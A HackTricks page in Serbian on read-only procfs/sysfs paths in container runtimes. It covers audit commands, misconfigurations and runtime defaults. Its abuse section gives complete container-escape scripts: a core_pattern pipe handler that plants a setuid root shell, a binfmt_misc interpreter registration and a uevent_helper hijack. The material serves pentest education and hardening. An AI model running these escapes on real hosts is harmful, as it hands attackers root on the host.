# Sistemske putanje samo za čitanje

{{#include ../../../../banners/hacktricks-training.md}}

Sistemske putanje samo za čitanje predstavljaju zasebnu zaštitu u odnosu na maskirane putanje. Umesto potpunog skrivanja putanje, runtime je izlaže, ali je montira samo za čitanje. Ovo je uobičajeno za odabrane lokacije u procfs i sysfs, gde pristup za čitanje može biti prihvatljiv ili operativno neophodan, ali bi upis bio previše opasan.

Svrha je jednostavna: mnogi kernel interfejsi postaju znatno opasniji kada je u njih moguće upisivati. Montiranje samo za čitanje ne uklanja svu vrednost za reconnaissance, ali sprečava kompromitovani workload da menja osnovne kernel-facing datoteke kroz tu putanju.

## Operation

Runtime-i često označavaju delove proc/sys prikaza kao samo za čitanje. U zavisnosti od runtime-a i hosta, to može obuhvatati putanje kao što su:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Tačan spisak se razlikuje, ali model je isti: omogućiti vidljivost tamo gde je potrebna, a podrazumevano onemogućiti izmene.

## Lab

Inspect Docker-declared read-only path list:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Pregledajte montirani proc/sys prikaz iz kontejnera:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Bezbednosni uticaj

Putanje sistema sa pristupom samo za čitanje ograničavaju veliki broj zloupotreba koje utiču na host. Čak i kada napadač može da pregleda procfs ili sysfs, nemogućnost upisivanja u njih uklanja mnoge direktne puteve za izmene koji uključuju kernel tunables, crash handlere, pomoćne programe za učitavanje modula ili druge kontrolne interfejse. Izloženost nije uklonjena, ali prelazak sa otkrivanja informacija na uticaj na host postaje teži.

## Pogrešne konfiguracije

Najčešće greške su uklanjanje maskiranja ili ponovno montiranje osetljivih putanja sa pristupom za čitanje i upis, direktno izlaganje sadržaja host proc/sys kroz writable bind mounts ili korišćenje privileged režima koji praktično zaobilaze bezbednije podrazumevane postavke runtime-a. U Kubernetes-u, `procMount: Unmasked` i privileged workloads često se pojavljuju zajedno sa slabijom proc zaštitom. Još jedna česta operativna greška jeste pretpostavka da svi workloads i dalje nasleđuju podrazumevanu postavku samo zato što runtime obično montira ove putanje sa pristupom samo za čitanje.

## Zloupotreba

Ako je zaštita slaba, počnite traženjem writable proc/sys unosa:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Kada su prisutni unosi sa dozvolom upisivanja, vredne putanje za dalji postupak uključuju:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Šta ove komande mogu otkriti:

- Writable entries under `/proc/sys` često znače da container može da menja ponašanje host kernela, a ne samo da ga pregleda.
- `core_pattern` je naročito važan zato što writable vrednost okrenuta ka hostu može da se pretvori u putanju za izvršavanje koda na hostu tako što se proces sruši nakon postavljanja pipe handler-a.
- `modprobe` otkriva helper koji kernel koristi za tokove povezane sa učitavanjem modula; to je klasična high-value meta kada je writable.
- `binfmt_misc` pokazuje da li je moguće registrovati custom interpreter. Ako je registracija writable, ovo može postati execution primitive, a ne samo information leak.
- `panic_on_oom` kontroliše kernel odluku na nivou celog hosta i zbog toga može da pretvori iscrpljivanje resursa u host denial of service.
- `uevent_helper` jedan je od najjasnijih primera gde writable sysfs helper path omogućava izvršavanje u host kontekstu.

Zanimljivi nalazi obuhvataju writable proc knobs ili sysfs entries okrenute ka hostu, koje bi normalno trebalo da budu read-only. U tom trenutku workload se iz ograničenog prikaza containera pomera ka značajnom uticaju na kernel.

### Kompletan primer: `core_pattern` Host Escape

Ako je `/proc/sys/kernel/core_pattern` writable iz containera i pokazuje na prikaz host kernela, može se zloupotrebiti za izvršavanje payload-a nakon crash-a:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Ako putanja zaista doseže host kernel, payload se izvršava na hostu i ostavlja setuid shell za sobom.

### Kompletan primer: `binfmt_misc` registracija

Ako je `/proc/sys/fs/binfmt_misc/register` upisiv, registracija prilagođenog interpreter-a može da omogući code execution kada se izvrši odgovarajuća datoteka:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Na `binfmt_misc` koji je dostupan hostu i u koji je moguće upisivati, rezultat je izvršavanje koda u putanji interpretera koju pokreće kernel.

### Kompletan primer: `uevent_helper`

Ako je `/sys/kernel/uevent_helper` upisiv, kernel može pozvati helper na host putanji kada se pokrene odgovarajući događaj:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Razlog zbog kog je ovo toliko opasno jeste taj što se putanja pomoćnog programa razrešava iz perspektive filesystem-a hosta, a ne iz bezbednog konteksta ograničenog na container.

## Provere

Ove provere utvrđuju da li je izlaganje procfs/sysfs samo za čitanje tamo gde se to očekuje i da li workload i dalje može da menja osetljive kernel interfejse.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Šta je ovde zanimljivo:

- Uobičajeni hardened workload trebalo bi da izlaže veoma malo writable proc/sys unosa.
- Writable `/proc/sys` putanje često su važnije od običnog read pristupa.
- Ako runtime navodi da je putanja read-only, ali je ona u praksi writable, pažljivo proverite mount propagation, bind mount-ove i privilege postavke.

## Podrazumevane postavke runtime-a

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Omogućeno podrazumevano | Docker definiše podrazumevanu listu read-only putanja za osetljive proc unose | izlaganje host proc/sys mount-ova, `--privileged` |
| Podman | Omogućeno podrazumevano | Podman primenjuje podrazumevane read-only putanje, osim ako se izričito ne ublaže | `--security-opt unmask=ALL`, široki host mount-ovi, `--privileged` |
| Kubernetes | Nasleđuje podrazumevane postavke runtime-a | Koristi osnovni runtime model read-only putanja, osim ako se oslabi Pod postavkama ili host mount-ovima | `procMount: Unmasked`, privileged workload-ovi, writable host proc/sys mount-ovi |
| containerd / CRI-O under Kubernetes | Podrazumevana postavka runtime-a | Obično se oslanja na OCI/runtime podrazumevane postavke | isto kao u Kubernetes redu; direktne promene konfiguracije runtime-a mogu oslabiti ponašanje |

Ključna stvar je da su read-only sistemske putanje obično prisutne kao podrazumevana postavka runtime-a, ali ih je lako oslabiti korišćenjem privileged režima ili host bind mount-ova.
{{#include ../../../../banners/hacktricks-training.md}}
